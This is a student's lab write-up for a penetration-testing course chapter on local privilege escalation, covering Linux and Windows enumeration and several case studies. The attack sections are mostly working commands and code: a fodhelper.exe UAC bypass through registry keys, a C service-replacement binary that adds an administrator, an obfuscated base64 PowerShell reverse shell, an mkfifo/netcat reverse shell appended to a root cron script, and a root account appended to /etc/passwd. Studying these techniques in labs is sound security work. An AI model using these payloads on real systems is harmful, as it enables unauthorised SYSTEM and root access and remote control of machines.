# 18.1.2 Manual Enumeration
**1. Perform various manual enumeration methods covered in this section on both your dedicated Windows and Linux clients. Try experimenting with various options for the tools and commands used in this section.**

In order to manually enumerate the system properly we can issue a number of commands. Although the section lists a few examples I will be posting my personal Linux process below.
***<note: words inside <> indicate the use of a variable>***

**Linux**
***Users***
```bash
whoami
id
cat /etc/passwd
```

***Operating System/Kernel/Drivers***
```bash
hostname
cat /etc/issue
cat /*-release
cat /proc/version
uname -a
dmesg | grep -i linux
rpm -q kernel
lsmod
/sbin/modinfo libdata
```

***AutoElevating Binaries***
```bash
find / -perm -u=s -type f 2>/dev/null
```

***Environment Variables***
```bash
env
set
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
cat ~/.zshrc
```

***Processes and Services***
```Bash
ps aux | grep root
ps -elf
top
cat /etc/service
dpkg -l
rpm -qa
```

***Files & Permissions***
```bash
find / -writable -type d 2>/dev/null
```
***Unmounted Drives***
```bash
mount
cat /etc/fstab
lsblk
```
***Cron***
```bash
crontab -l
cat /etc/cron*
```
***Network***
```Bash
hostname
ifconfig
ip a
ip link
ip addr
/sbin/route
grep -Hs iptables /etc/*
cat /etc/network/interfaces
cat /etc/sysconfig/network
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
dnsdomainname
lsof -i
lsof -i :80

ss -anp
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
```


**WINDOWS**
***Users
```powershell
whoami
net user # enumerate usernames
net  user <USERNAME> # enumerate username "USERNAME"
```

***Network***
```powershell
hostname
ipconfig /all
```

***Firewall***
```powershell
netsh advfirewall show current profile
netsh advfirewall firewall show rule name=all
```

***Operating System/Kernel/Drivers***
```powershell
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe get Caption, Description, HotFixID, InstalledOn
PS> driverquery.exe /v /fo csv | ConverFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```
***Processes and Services***
```powershell
tasklist /SVC
route print
netstat -ano
wmic get name, version, vendor
```
**AutoElevating Binaries***
```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```
***Scheduled Tasks***
```powershell
schtasks /query /fo LIST /v
```

***Files & Permissions***
```powershell
accesschk.exe -uws "Everyone" "C:\Program Files"
PS> Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString - match "Everyone\sAllow\s\sModify"}
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```
***Unmounted Drives***
```powershell
mountvol
```


# 18.1.4 Automated Enumeration

**1.  Inspect your Windows and Linux clients by using the tools and commands presented in this section in order to get comfortable with automated local enumeration techniques.**

For windows, we can start by exploring some of the options present in the "windows-pricesc-check2.exe" binary. To start lets list out the "Help" contents with the -h flag.
```
C:\Tools\privilege_escalation\windows-privesc-check-master>windows-privesc-check2.exe -h
windows-privesc-check v2.0 (http://pentestmonkey.net/windows-privesc-check)

Usage: C:\Tools\privilege_escalation\windows-privesc-check-master\windows-privesc-check2.exe (--dump [ dump opts] | --dumptab | --audit) [examine opts] [host opts] -o report-file-stem

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  --dump                Dumps info for you to analyse manually
  --dumptab             Dumps info in tab-delimited format
  --audit               Identify and report security weaknesses
  --pyshell             Start interactive python shell

  examine opts:
    At least one of these to indicate what to examine (*=not implemented)

    -a, --all           All Simple Checks (non-slow)
    -A, --allfiles      All Files and Directories (slow)
    -D, --drives        Drives
    -e, --reg_keys      Misc security-related reg keys
    -E, --eventlogs     Event Log*
    -f INTERESTING_FILE_LIST, --interestingfiledir=INTERESTING_FILE_LIST
                        Changes -A behaviour.  Look here INSTEAD
    -F INTERESTING_FILE_FILE, --interestingfilefile=INTERESTING_FILE_FILE
                        Changes -A behaviour.  Look here INSTEAD.  On dir per
                        line
    -G, --groups        Groups
    -H, --shares        Shares
    -I, --installed_software
                        Installed Software
    -j, --tasks         Scheduled Tasks
    -k, --drivers       Kernel Drivers
    -L, --loggedin      Logged In
    -O, --ntobjects     NT Objects
    -n, --nointerestingfiles
                        Changes -A/-f/-F behaviour.  Don't report interesting
                        files
    -N, --nounreadableif
                        Changes -A/-f/-F behaviour.  Report only interesting
                        files readable by untrsuted users (see -x, -X, -b, -B)
    -P, --progfiles     Program Files Directory Tree
    -r, --registry      Registry Settings + Permissions
    -R, --processes     Processes
    -S, --services      Windows Services
    -t, --paths         PATH
    -T PATCHFILE, --patches=PATCHFILE
                        Patches.  Arg is filename of xlsx patch info.
                        Download from
                        http://go.microsoft.com/fwlink/?LinkID=245778 or pass
                        'auto' to fetch automatically
    -U, --users         Users
    -v, --verbose       More verbose output on console
    -W, --errors        Die on errors instead of continuing (for debugging)
    -z, --noappendices  No report appendices in --audit mode

  host opts:
    Optional details about a remote host (experimental).  Default is
    current host.

    -s REMOTE_HOST, --server=REMOTE_HOST
                        Remote host or IP
    -u REMOTE_USER, --user=REMOTE_USER
                        Remote username
    -p REMOTE_PASS, --pass=REMOTE_PASS
                        Remote password
    -d REMOTE_DOMAIN, --domain=REMOTE_DOMAIN
                        Remote domain

  dump opts:
    Options to modify the behaviour of dump/dumptab mode

    -M, --get_modals    Dump password policy, etc.
    -V, --get_privs     Dump privileges for users/groups

  report opts:
    Reporting options

    -o REPORT_FILE_STEM, --report_file_stem=REPORT_FILE_STEM
                        Filename stem for txt, html report files
    -x IGNORE_PRINCIPAL_LIST, --ignoreprincipal=IGNORE_PRINCIPAL_LIST
                        Don't report privesc issues for these users/groups
    -X IGNORE_PRINCIPAL_FILE, --ignoreprincipalfile=IGNORE_PRINCIPAL_FILE
                        Don't report privesc issues for these users/groups
    -0, --ignorenoone   No one is trusted (even Admin, SYSTEM).  hyphen zero
    -c, --exploitablebycurrentuser
                        Report only privesc issues relating to current user
    -b EXPLOITABLE_BY_LIST, --exploitableby=EXPLOITABLE_BY_LIST
                        Report privesc issues only for these users/groups
    -B EXPLOITABLE_BY_FILE, --exploitablebyfile=EXPLOITABLE_BY_FILE
                        Report privesc issues only for these user/groupss
```
We can see a number of different ways we can utilize this tool to check for possible privilege escalation strategies. For example, lets take a look at the system's user groups with the following command:
`C:\Tools\privilege_escalation\windows-privesc-check-master>windows-privesc-check2.exe --dump -G`
![[privesc_dump_groups.png]]

For unix based systems we can use a similar script known as "unix-privesc-check". Running the script with no arguments will show us the help menu. We can run the script with the "standard" flag and pipe the output to a text file to review.

We can see from our output that the /etc/passwd file is world writeable.
![[unix_privesc.png]]

**2.  Experiment with different windows-privesc-check and unix_privesc_check options.**

Continuing with the unix-privesc-check script we start by changing our previous flag of "standard" to "detailed" We can then pipe the output of this script to a text file.
`./unix-privesc-check detailed 1> privesc_detailed.txt`
We can then search this output for the string "WARNING", making note of anything of interest. From this we can see a number of possible attack vectors. 

![[Pasted image 20220724210628.png]]

Moving on to windows, we can continue exploring the options of windows-privesc-check2.exe, this time taking a look at scheduled tasks on the system.
`windows-privesc-check2.exe -j --dump`

And we can see a large amount of information returned to us.

![[dump_tasks.png]]

# 18.2.4 UAC Bypass: fodhelper.exe Case Study
**1. Log in to your Windows client as the admin user and attempt to bypass UAC using the application and technique covered above.**

In the following example we will be leveraging fodhelper.exe, a binary responsible for managing language changes in the operating system. As this binary runs as *high integrity* we can leverage this application and its interaction with registry keys to run a command of our choosing as high integrity.

We start fodhelper.exe binary with the goal of inspecting the program's manifest. We can do this with sigcheck.exe, a binary included in sysinternals.

`C:\Windows\System32\fodhelper.exe
`
`sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe`
![[sigcheck.png]]

We see from these results that the "autoElevate" flag is set to "true" meaning that the executable will auto elevate to high integrity without prompting the user for consent. 
We can now move to process monitor in order to better understand this tool. We do this by starting Procmon.exe and then running fodhelper.exe, setting filters to monitor only fodhelper.exe and the registry keys it interacts with.

![[procmon_filters_reg.png]]

We can filter this down even further by adding a check to only include registry keys that do not exist and are able to be modified by us, hopefully allowing us to hijack one of these keys for our own command.

![[procmon_filters_name.png]]

We can see an interesting key being queried despite not existing. We can modify our filter to only include the key from this path to investigate further. We can also remove our result filter to gain more information on what is happening here.
![[ms-settings_shell.png]]
We can see that once the program fails to run the key via HKCU it then attempts to run the same key in HKCR, or "Classes Root" hive, and is successful. Lets inspect this key in regedit.

![[default_key_setting.png]]
We can see the key does exist in HKCR and after doing a bit of research we learn that the fodhelper.exe is opening a specific section of the Windows settings application via the ms-settings application. These application mappings can be defined through the registry editor. As the process calls a key which does not exist before calling the key located in HKCR we should be able to hijack this request and inject our own command. We can add our own key with the following command:

`REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command`

From here, lets adjust our filter to properly capture our changes and we spot a new query, DelegateExecute.
![[deligate_execute.png]]
We can now add an empty DelegateExecute entry. When fodhelper.exe discovers this empty value it should look for a program to launch specified in the `Shell\Open\command` key entry. We can add this to our registry with the following command:
`REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ`

We can now verify this with by removing the "NAME NOT FOUND" filter, replacing it with "SUCCESS".
![[delegate_execute_success.png]]

fodhelper.exe has found our new key but as it is empty it moves on to the default command entry. We can now replace the empty default value with our own executable.  We can do this with the following command:
`REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "calc.exe" /f`

Now we just need to run the fodhelper.exe binary again and we should get our "calc.exe" execution.
![[calc_PoC.png]]
Adjusting this command from "calc.exe" to "cmd.exe" will spawn a cmd.exe shell with UAC bypassed.
![[UAC_bypassed_cmd.png]]

# 18.2.6 Inescure File Permissions: Servilo Cast Study
**1.  Log in to your Windows client as an unprivileged user and attempt to elevate your privileges to SYSTEM using the above vulnerability and technique.**

If a service is running as system and the permissions are misconfigured we may be able to replace the program, allowing us to escalate our privileges. To start, lets enumerate the current running services with the following powershell command:
`Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
![[Pasted image 20220726104103.png]]

We see that Serviio is running from the Program Files directory which means this is a user-installed service. The next step is to investigate the permissions set on the service. We can do this with icacls.

![[Pasted image 20220726104324.png]]
We can see that the service allows members of the `BUILTIN\Users` group full access, a serious vulnerability. Lets leverage this to elevate our permissions. We start by compiling a malicious binary written in C that will add a user to the administrators group.

code:
```C
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user evil Ev!lpass /add");
  i = system ("net localgroup administrators evil /add");
  
  return 0;
}
```

compiling:
`i686-w64-mingw32-gcc adduser.c -o adduser.exe`
After transfering this file to our Windows machine we can then replace the original ServiioService.exe binary with our malicious copy.
create backup:
`move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"`
move malicious program into Serviio directory and rename:
`move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"``

As we do not have permissions to restart the service we can force a restart by simply rebooting the machine. After logging back in we can check the Administrators group and see our new user.
![[Pasted image 20220726110517.png]]





**2.  Attempt to get a remote system shell rather than adding a malicious user.**

In order to get a remote shell we must simply edit our original exploit and replace the original system command which adds a new user with a new system command which invokes a reverse shell via powershell. The binary will be generated from the following code:
```C
#include <stdlib.h>

int main ()
{
  int i;

  i = system ("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA5ADcAIgAsADkAMAAwADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA");

  return 0;
}
```

Once compiled into an exe we then follow the same steps as above, transferring the file to our windows machine, replacing the original "ServiioService.exe" binary, and restarting the system to restart the service. Before we reboot the machine we start a listener which, upon next login, will receive a reverse connection.

![[Pasted image 20220726111659.png]]


# 18.3.3 Insecure File Permissions - Cron Case Study
**1. Log in to your Debian client as an unprivileged user and attempt to elevate your privileges to root using the above technique.**

To start, let's take a look at cron jobs running in the cron.log file. We can do this by grepping "CRON" from the log.
`grep "CRON" /var/log/cron.log`
![[Pasted image 20220726164159.png]]
We can see a script labeled "user_backups.sh" is being run as root. Taking a look at the permissions of the file reveal that we have write access. 
![[Pasted image 20220726164327.png]]
We can simply edit this script, appending a reverse shell. As the script is being run as root this reverse shell will also be run as root. We can append this script with the "mkfifo" command, essentially creating a named pipe which contains the commands for our reverse shell.
`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh`

Now we just need to wait for the job to run (every 5 minutes) and we will receive our reverse connection.
![[Pasted image 20220726165546.png]]

# 18.3.5 Insecure File Permissions: /etc/passwd Case Study
**1. Log in to your Debian client with your student credentials and attempt to elevate your privileges by adding a superuser account to the /etc/passwd file.**


As the /etc/password file is world writable, privilege escalation is fairly straightforward. We simply need to append a new superuser with a hashed password and a UID/GID of 0. First, lets generate the password hash.
`openssl passwd newpass`

Then we append our new user with our generated password to the /etc/passwd file.
`echo "dials:HMT7fWPZwTQ2Q:0:0:root:/root:/bin/bash" >> /etc/passwd`

We can then switch to our new user via the `su` command and we should be root.
![[Pasted image 20220726170059.png]]

